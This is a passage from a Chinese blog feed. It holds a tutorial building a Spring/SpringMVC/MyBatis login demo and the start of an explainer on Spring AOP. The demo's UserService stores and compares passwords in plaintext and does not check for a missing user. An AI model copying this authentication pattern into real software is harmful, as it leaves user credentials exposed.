class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 自动搜索mapper接口 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.cyan.Mapper&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 事务处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;txManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;datasource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;txManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;insert*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;select*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;SUPPORTS&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;serviceCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(public * Service.*.*(..))&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;serviceCut&quot;</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>springMVC-config.xml</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring可以自动去扫描base-pack下面或者子包下面的java文件，</span></span><br><span class="line"><span class="comment">    如果扫描到有@Component @Controller@Service等这些注解的类，则把这些类注册为bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.cyan.Controller&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.web.bind.annotation.ControllerAdvice&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置jsp文件的前后缀 “／”代表的是项目设定的Resource目录 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四-、详细类设计"><a href="#四-、详细类设计" class="headerlink" title="(四)、详细类设计"></a>(四)、详细类设计</h3><ol><li>－mapper<br>UserMapper</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyan.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cyan.Model.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cyan on 16/3/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from LoginDemo&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">selectUser</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from LoginDemo where username=#&#123;username&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">selectUserByUsername</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span>String username)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>－entity<br>User</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyan.Entity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cyan on 16/3/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username,password,slogan;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSlogan</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> slogan;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSlogan</span><span class="params">(String slogan)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.slogan = slogan;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>－service</li></ol><ul><li>IUserService</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyan.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cyan.Entity.User;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cyan on 16/3/31.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUserByName</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String username,String pwd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>UserService<br>Spring中的几个标签@Component（声明一个类是Spring容器管理的类，可以细分为后面提到的三个标签）、@Controller（控制层）、@Service（服务层）、@Repository（持久层）。标签的作用是让Spring根据名字关联到这个类。</li></ul><p>@Autowired标签默认以byType的形式注入，使用这个标签是不需要getter和setter方法的。（这次代码中因为用户名密码校验部分要用到get方法所以写上了）<br>可以配合@Qualifier标签根据bean的id来装配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyan.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cyan.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.cyan.Entity.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cyan on 16/3/31.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Service(&quot;userService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserService</span> <span class="keyword">implements</span> <span class="title">IUserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserMapper</span><span class="params">(UserMapper userMapper)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userMapper = userMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUserByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectUserByUsername(name).get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String username, String pwd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(userMapper.selectUserByUsername(username).get(<span class="number">0</span>).getPassword().equals(pwd))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>－controller<br>Login</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cyan.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cyan.Service.IUserService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by cyan on 16/3/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IUserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value =&quot;/login&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String pwd=req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(userService.verify(username,pwd))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,userService.getUserByName(username));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>jsp页面</li></ol><ul><li>index.jsp</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: cyan</span><br><span class="line">  Date: <span class="number">16</span>/<span class="number">3</span>/<span class="number">29</span></span><br><span class="line">  Time: <span class="number">15</span>:<span class="number">55</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/login&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">      用户名:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> id=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      密码:&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>success.jsp</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.cyan.Entity.User&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: cyan</span><br><span class="line">  Date: <span class="number">16</span>/<span class="number">3</span>/<span class="number">31</span></span><br><span class="line">  Time: <span class="number">23</span>:<span class="number">45</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;LoginSuccess&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">登录成功!</span><br><span class="line">&lt;%</span><br><span class="line">    User user=(User)session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">用户名:&lt;%=user.getUsername()%&gt;&lt;br&gt;</span><br><span class="line">个性签名:&lt;%=user.getSlogan()%&gt;&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="运行结果，大家自行测试。"><a href="#运行结果，大家自行测试。" class="headerlink" title="运行结果，大家自行测试。"></a>运行结果，大家自行测试。</h3><h3 id="感谢阅读！"><a href="#感谢阅读！" class="headerlink" title="感谢阅读！"></a>感谢阅读！</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、什么是SSM框架：&quot;&gt;&lt;a href=&quot;#一、什么是SSM框架：&quot; class=&quot;headerlink&quot; title=&quot;一、什么是SSM框架：&quot;&gt;&lt;/a&gt;一、什么是SSM框架：&lt;/h2&gt;&lt;p&gt;SSM框架是Spring、SpringMVC和Mybatis框架的整</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://zhizhi111.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spring" scheme="http://zhizhi111.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring,AOP的理解</title>
    <link href="http://zhizhi111.github.io/2021/12/25/spring-AOP%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>http://zhizhi111.github.io/2021/12/25/spring-AOP%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2021-12-25T10:29:23.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、Spring是什么？"><a href="#一、Spring是什么？" class="headerlink" title="一、Spring是什么？"></a>一、Spring是什么？</h1><p>Spring是一个轻量级的2EE框架。它是一个容器框架，用来装<code>javabean</code>(java对象)，中间层框架(万能胶)可以起到一个连接作用，比如把Struts和hibernate粘合在一起运作，可以让我们的企业开发更快，更简洁。<br>spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器框架。</p><ul><li>1、从大小与开销两方面而言，spring都是轻量级的</li><li>2、通过控制反转(IoC)的技术达到松耦合的目的</li><li>3、提供了面向切面编程的丰富支持，允许通过分离应用的业务逻辑与系统级服务进行内聚性的开发</li><li>4、包含并管理应用对象(Bean)的配置和生命周期，这个意义上是一个容器</li><li>5、将简单的组件配置，组合成为复杂的应用，这个意义上是一个框架</li></ul><h1 id="二、AOP的理解"><a href="#二、AOP的理解" class="headerlink" title="二、AOP的理解"></a>二、AOP的理解</h1><p>系统是由许多不同的组件所组成的，每一个组件各负责一块特定功能。除了实现自身核心功能之外，这些组件还经常承担着额外的职责。例如日志、事物管理和安全这样的核心服务经常融入到自身具有核心业务逻辑的组件中去，这些系统服务经常被称为横切关注点，因为它们会跨越系统多个组件。</p><p>当我们需要为分散的对象引入公共行为的时候，OOP则显得无能为力。也就是说，OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系，例如日志功能。</p><p>日志代码往往水平的散布在所有对象层，而与它所散布到的对象的核心功能搞无关系，在OOP设计中，它导致了大量代码的重复，而不利于各个模块的重用。</p><p>AOP：将程序中的交叉业务了逻辑(比如安全、日志、事物等)，封装成一个切面，然后注入到目标对象(具体业务逻辑)中去。AOP可以对某个对象或某些对象的功能进行增强，比如对象中的方法进行增强，可以在执行某个方法之前额外的做一些事情，在某个方法执行之后额外做一些事情。</p><h1 id="三、AOP-讲义"><a href="#三、AOP-讲义" class="headerlink" title="三、AOP(讲义)"></a>三、AOP(讲义)</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>（1）在软件业，AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP( Oriented Object Programming)的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</p><p>（2）说到AOP，我们就不得不来提一下软件的纵向和横向问题。从纵向结构来看就是我们软件系统的各个模块，它主要负责处理我们的核心业务（例如商品订购、购物车查看）；而从横向结构来看，我们几乎每个系统又包含一些公共模块（例如 权限、日志模块等）。这些公共模块分布于我们各个核心业务之中（例如订购和查看商品明细的过程都需要检查用户权限、记录系统日志等）。这样一来不仅在开发过程中要处处关注公共模块的处理而且开发后维护起来也是十分麻烦。而有了AOP之后将应用程序中的商业逻辑同对其提供支持的通用服务进行分离，使得开发人 员可以更多的关注核心业务开发。</p><p><img src="https://s2.loli.net/2021/12/26/82rfukJS35LcOPs.png" alt="软件纵向与横向结构"></p><h2 id="2、AOP开发中的相关术语"><a href="#2、AOP开发中的相关术语" class="headerlink" title="2、AOP开发中的相关术语"></a>2、AOP开发中的相关术语</h2><h3 id="1-链接点-Joinpoint"><a href="#1-链接点-Joinpoint" class="headerlink" title="* (1) 